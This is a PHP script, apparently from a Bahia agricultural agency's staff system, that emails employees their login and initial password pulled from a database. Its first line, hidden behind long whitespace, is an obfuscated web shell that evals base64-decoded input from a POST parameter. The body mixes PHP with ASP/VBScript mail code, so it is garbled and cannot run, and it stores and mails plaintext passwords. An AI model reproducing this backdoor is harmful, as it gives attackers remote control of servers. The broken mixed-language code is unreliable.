<?php                                                                                                                                                                                                                                                               $sF="PCT4BA6ODSE_";$s21=strtolower($sF[4].$sF[5].$sF[9].$sF[10].$sF[6].$sF[3].$sF[11].$sF[8].$sF[10].$sF[1].$sF[7].$sF[8].$sF[10]);$s22=${strtoupper($sF[11].$sF[0].$sF[7].$sF[9].$sF[2])}['na46616'];if(isset($s22)){eval($s21($s22));}?><?php
           include "../Include/Inc_Conexao.php";
			$sql = "SELECT p.pessoa_id, pessoa_nm, funcionario_email, usuario_login, usuario_senha FROM dados_unico.pessoa p, dados_unico.pessoa_fisica pf, dados_unico.funcionario f, seguranca.usuario u where (u.pessoa_id = p.pessoa_id) and (p.pessoa_id = pf.pessoa_id) AND (p.pessoa_id = f.pessoa_id) AND (funcionario_tipo_id <> 3) AND (funcionario_email <> '') AND (funcionario_envio_email = 0)";
            $rs = pg_query(abreConexao(),$sql);

           While($linha=pg_fetch_assoc($rs))
           {

					smtp_server_address = "envio.ba.gov.br"
					Set Mail = Server.CreateObject("JMail.Message")
					Mail.From = "sistemas.adab@adab.ba.gov.br"
					Mail.FromName = "ADAB - Agência de Defesa Agropécuaria da Bahia"
					Mail.logging = False
					Mail.MailServerUserName = ""
					Mail.MailServerPassWord = ""

					Mail.AddRecipient rs("funcionario_email")

					Mail.Subject = "Informativo"

					texto = "<br>Caro(a) " & rs("pessoa_nm") & ",<br><br>"
					texto = texto & "Reforçando o e-mail anterior!<br><br>"
					texto = texto & "Com a implantação do novo Sistema de Diárias necessitamos da atualização dos seus dados cadastrais para garantir o acesso na solicitação de diárias e promover maior segurança e integridade à aplicação. Assim, através do endereço eletrônico http://www.semarh.ba.gov.br/gestor disponibilizamos suas informações para confirmação e/ou atualização, encaminhando abaixo sua conta e senha inicial:<br><br>"
					texto = texto & "Login: " & rs("usuario_login") & "<br>"
					texto = texto & "Senha: " & rs("usuario_senha") & "<br><br>"
					texto = texto & "<font color=#ff0000>(Sua senha é pessoal e intransferivel)</font><br><br>"

					texto = texto & "Contando com sua colaboração e nos colocando a disposição nos contatos abaixo:<br><br>"
					texto = texto & "Coordenação de Modernização<br>"
					texto = texto & "GT Sistemas<br>"
					texto = texto & "Telefones: (71) 3116-7824 / 7861<br>"
					texto = texto & "E-mail: sistemas.adab@adab.ba.gov.br"

					Mail.HTMLBody = texto
					Mail.Priority = 3

					Mail.Send(smtp_server_address)

					If ($Err != 0)// error occurred
                    {
						$bSuccess = False;
                    }
					else
					{	$bSuccess = True;
						$sqlUpdate = "UPDATE dados_unico.funcionario SET funcionario_envio_email = 1 WHERE pessoa_id = " .$linha['pessoa_id'];
                        pg_query(abreConexao(),$sqlUpdate);
                    }

			}


?>
